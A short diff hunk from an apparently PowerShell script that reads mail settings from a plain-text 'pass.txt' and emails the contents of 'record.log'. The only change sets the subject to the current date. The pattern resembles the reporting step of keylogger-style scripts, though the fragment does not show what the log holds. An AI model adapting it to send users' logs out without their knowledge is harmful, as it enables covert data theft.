@@ -4,7 +4,7 @@
 $file_data = Get-Content pass.txt
 $EmailFrom = $file_data[2]
 $EmailTo = $file_data[2]
-$Subject = “The subject of your email”
+$Subject = Get-Date
 $Body = Get-Content record.log
 $SMTPServer = $file_data[3]
 $mailusername = $file_data[0]
